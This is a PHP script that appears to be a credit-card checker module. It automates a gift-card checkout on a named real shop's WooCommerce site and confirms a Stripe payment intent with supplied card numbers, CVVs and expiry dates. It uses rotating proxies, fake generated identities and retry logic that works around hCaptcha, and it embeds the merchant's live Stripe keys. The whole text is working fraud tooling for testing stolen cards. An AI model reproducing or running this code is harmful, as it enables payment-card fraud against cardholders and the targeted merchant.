<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$cookie = uniqid();

$fake = $this->tools->GetUser();

$data = 'wc_gc_giftcard_to_multiple=&wc_gc_giftcard_cc=&wc_gc_giftcard_from=&wc_gc_giftcard_message=&wc_gc_giftcard_delivery=&_wc_gc_giftcard_delivery_gmt_offset=5&wc_gc_sag_checkbox=posted&nyp=5.00&update-price=&_nypnonce=&quantity=1&add-to-cart=7544';

$r1 = $this->curlx->Post('https://greylarsen.com/shop/product/gift-card-2/', $data, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$r2 = $this->curlx->Get('https://greylarsen.com/shop/checkout/', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$createPaymentIntentNonce = trim(strip_tags($this->getstr($r2->body, '"createPaymentIntentNonce":"', '"')));

$nonce_v1 = trim(strip_tags($this->getstr($r2->body, 'woocommerce-process-checkout-nonce" value="', '"')));

$update_order_review_nonce = trim(strip_tags($this->getstr($r2->body, 'update_order_review_nonce":"', '"')));

if (empty($createPaymentIntentNonce) || empty($nonce_v1) || empty($update_order_review_nonce)) {
	$empty = 'Second Request Tokens is Empty';

	goto start;
}

$data = 'security='.$update_order_review_nonce.'&payment_method=woocommerce_payments&country=US&state=NY&postcode=10509&city=Brewster&address=12+main+street&address_2=&s_country=US&s_state=NY&s_postcode=10509&s_city=Brewster&s_address=12+main+street&s_address_2=&has_full_address=true&post_data=billing_email%3D'.urlencode(urlencode($fake->email)).'%26billing_first_name%3D'.$fake->first.'%26billing_last_name%3D'.$fake->last.'%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D12%2520main%2520street%26billing_address_2%3D%26billing_city%3DBrewster%26billing_state%3DNY%26billing_postcode%3D10509%26billing_phone%3D2564567654%26account_password%3D%26order_comments%3D%26payment_method%3Dwoocommerce_payments%26wcpay-payment-method-upe%3D%26wcpay_selected_upe_payment_type%3D%26wcpay_payment_country%3D%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D'.$nonce_v1.'%26_wp_http_referer%3D%252Fshop%252Fcheckout%252F';

$r3 = $this->curlx->Post('https://greylarsen.com/shop/?wc-ajax=update_order_review', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$nonce_v2 = trim(strip_tags($this->getstr($r3->body, 'woocommerce-process-checkout-nonce\" value=\"', '\"')));

if (empty($nonce_v2)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$fingerprint = $this->tools->GenPass(32);

$data = '_ajax_nonce='.$createPaymentIntentNonce.'&wcpay-fingerprint='.$fingerprint;

$r4 = $this->curlx->Post('https://greylarsen.com/shop/?wc-ajax=wcpay_create_payment_intent', $data, null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$client_secret = trim(strip_tags($this->getstr($r4->body, '"client_secret":"', '"')));

$pi_id = explode('_secret_', $client_secret)[0];

if (empty($pi_id)) {
	$empty = 'Fourth Request Tokens is Empty';

	goto start;
}

$data = [
	'billing_email' => $fake->email,
	'billing_first_name' => $fake->first,
	'billing_last_name' => $fake->last,
	'billing_company' => '',
	'billing_country' => 'US',
	'billing_address_1' => '12 main street',
	'billing_address_2' => '',
	'billing_city' => 'Brewster',
	'billing_state' => 'NY',
	'billing_postcode' => '10509',
	'billing_phone' => '2564567654',
	'account_password' => '',
	'order_comments' => '',
	'payment_method' => 'woocommerce_payments',
	'wcpay-payment-method-upe' => '',
	'wcpay_selected_upe_payment_type' => 'card',
	'wcpay_payment_country' => 'US',
	'terms' => 'on',
	'terms-field' => '1',
	'woocommerce-process-checkout-nonce' => $nonce_v2,
	'_wp_http_referer' => '/shop/?wc-ajax=update_order_review',
	'wc_payment_intent_id' => $pi_id,
	'wcpay-fingerprint' => $fingerprint
];

$r5 = $this->curlx->Post('https://greylarsen.com/shop/?wc-ajax=checkout', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$json_r5 = json_decode($r5->body);

$return_url = $json_r5->redirect_url ?? '';

if (empty($return_url)) {
	$empty = 'Fifth Request Tokens is Empty';

	goto start;
}

$data = 'return_url='.urlencode($return_url).'&payment_method_data[billing_details][name]='.$fake->first.'+'.$fake->last.'&payment_method_data[billing_details][email]='.urlencode($fake->email).'&payment_method_data[billing_details][phone]=2564567654&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=12+main+street&payment_method_data[billing_details][address][line2]=-&payment_method_data[billing_details][address][city]=Brewster&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][address][postal_code]=10509&payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$yy.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[payment_user_agent]=stripe.js%2F951997b0b%3B+stripe-js-v3%2F951997b0b%3B+payment-element&payment_method_data[time_on_page]='.rand(50000, 100000).'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1LtGj2FgzzjRdATP&client_secret='.$client_secret;

$r6 = $this->curlx->Post('https://api.stripe.com/v1/payment_intents/'.$pi_id.'/confirm', $data, null, $cookie, $server['proxy']);

if (!$r6->success) goto start;

if (strpos($r6->body, 'verify_challenge') !== false) {
	$empty = 'Sixth Request Contains HCaptcha!';

	goto start;
}

$json_r6 = json_decode($r6->body);

if (isset($json_r6->error)) {
	$status = $this->response->ErrorHandler($json_r6->error);

	goto end;
}

file_put_contents('stw_r6_no_err.txt', $r6->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r6->body);

end: